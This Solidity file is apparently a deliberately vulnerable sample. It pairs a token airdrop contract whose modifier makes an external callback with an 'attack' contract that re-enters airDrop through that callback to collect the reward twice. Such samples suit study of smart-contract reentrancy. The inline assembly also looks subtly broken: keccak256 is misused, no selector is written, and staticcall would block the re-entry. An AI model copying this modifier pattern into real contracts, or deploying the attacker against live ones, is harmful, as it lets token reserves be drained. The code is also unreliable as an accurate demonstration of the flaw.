pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

  modifier supportsToken() {
    assembly {
      let ptr := mload(0x40)
      mstore(ptr, 0x20)
      let result := staticcall(gas, caller, ptr, 0x20, ptr, 0x20)
      if iszero(result) { revert(0, 0) }
      let hashed := mload(ptr)
      if iszero(eq(hashed, keccak256("Nu Token", 8))) { revert(0, 0) }
    }
    _;
  }
  
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}